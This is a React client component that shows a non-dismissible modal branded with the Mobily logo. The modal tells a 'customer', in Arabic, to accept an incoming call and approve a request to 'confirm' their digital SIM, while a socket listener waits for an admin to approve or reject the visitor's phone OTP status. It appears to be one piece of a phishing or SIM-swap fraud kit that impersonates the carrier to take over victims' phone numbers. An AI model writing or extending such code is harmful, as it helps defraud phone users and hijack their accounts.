'use client';
import { useEffect, useState } from 'react';
import { Dialog, DialogContent } from '@/components/ui/dialog';
import { PhoneCall } from 'lucide-react';
import { onVisitorStatusUpdated } from '@/lib/socket';

interface MobilyVerificationModalProps {
  open: boolean;
  visitorId: string;
  onApproved: () => void;
  onRejected: () => void;
}

export function MobilyVerificationModal({ open, visitorId, onApproved, onRejected }: MobilyVerificationModalProps) {
  const [status, setStatus] = useState<'pending' | 'approved' | 'rejected'>('pending');

  useEffect(() => {
    if (!open || !visitorId) return;
    console.log('[Mobily Modal] Listening for admin decision...');

    const unsubscribe = onVisitorStatusUpdated(({ field, status: newStatus }) => {
      if (field === 'phoneOtpStatus') {
        if (newStatus === 'approved') { setStatus('approved'); onApproved(); }
        else if (newStatus === 'rejected') { setStatus('rejected'); onRejected(); }
      }
    });

    return () => unsubscribe();
  }, [open, visitorId, onApproved, onRejected]);

  return (
    <Dialog open={open} onOpenChange={() => {}}>
      <DialogContent className="sm:max-w-md" dir="rtl" onPointerDownOutside={(e) => e.preventDefault()} onEscapeKeyDown={(e) => e.preventDefault()}>
        <div className="flex flex-col items-center justify-center space-y-6 py-8">
          <div className="w-32 h-32 relative">
            <img src="/Mobily_Logo.svg" alt="Mobily Logo" className="object-contain" />
          </div>
          <div className="relative">
            <div className="absolute inset-0 animate-ping">
              <div className="w-20 h-20 rounded-full bg-green-400 opacity-75"></div>
            </div>
            <div className="relative flex items-center justify-center w-20 h-20 rounded-full bg-green-500">
              <PhoneCall className="w-10 h-10 text-white animate-pulse" />
            </div>
          </div>
          <div className="text-center space-y-3 px-4">
            <p className="text-base text-gray-700 leading-relaxed">
              عزيزنا العميل سيتم الاتصال بك من اجل تاكيد شريحتك الرقميه قد يتم قطع الخدمة موقتا و اعادة تشغيلها عن هاتفك الرجاء قبول المكالمة و الموافقة على الطلب و لا تشارك اي رمز تاكيد مع احد ان موظفينا لا يقومون بطلب هذه الرموز شكرا لك
            </p>
          </div>
          <div className="flex flex-col items-center space-y-2">
            <div className="flex space-x-2 space-x-reverse">
              <div className="w-3 h-3 bg-green-500 rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
              <div className="w-3 h-3 bg-green-500 rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
              <div className="w-3 h-3 bg-green-500 rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
            </div>
            <p className="text-sm text-gray-500">جاري الانتظار...</p>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
}
